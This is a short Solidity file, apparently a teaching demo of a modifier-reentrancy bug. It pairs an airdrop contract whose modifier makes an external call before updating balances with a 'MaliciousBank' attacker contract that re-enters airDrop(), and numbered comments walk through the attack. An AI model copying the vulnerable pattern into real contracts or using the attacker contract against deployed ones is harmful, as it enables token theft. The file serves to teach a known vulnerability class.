pragma solidity ^0.8.17;

contract Bank{
    function supportsToken() external returns(bytes32) {
        return keccak256(abi.encodePacked("Ed Token"));
    }
}

contract ModifierEntrancy {
    mapping (address => uint) public tokenBalance;
    string constant name = "Ed Token";
    Bank bank;

    modifier hasNoBalance {
        require(tokenBalance[msg.sender] == 0);
        _;
    }

    modifier supportsToken() {
        require(keccak256(abi.encodePacked("Ed Token")) == bank.supportsToken());
        _;
    }

    constructor() public{
        bank = new Bank();
    }

    // if contract has 0 balance and supports given token -> give some tokens
    function airDrop() hasNoBalance supportsToken public {
        tokenBalance[msg.sender] += 20;
    }
}

////////// C A U T I O N //////////

contract MaliciousBank {
    address public victim; // contract address
    bytes32 private constant FAKE_TOKEN = keccak256(abi.encodePacked("Ed Token"));
    
    constructor(address _victim) {
        victim = _victim;
    }

    function supportsToken() external returns (bytes32) {
        // attacker calls airDrop() during supportsToken execution
        ModifierEntrancy(victim).airDrop();
        return FAKE_TOKEN;
    }
}

// U S A G E
// 1. Deploying ModifierEntrancy
// 2. Deploying MaliciousBank giving the address of ModifierEntrancy
// 3. If can change bank inside of ModifierEntrancy(for ex via constructor), give MaliciousBank addr
// 4. Call airDrop() in ModifierEntrancy
// 5. Modifier calls supportsToken() fn in attacker --> it calls airDrop() again 
// 6. Result --> hasNoBalance didn't work correctly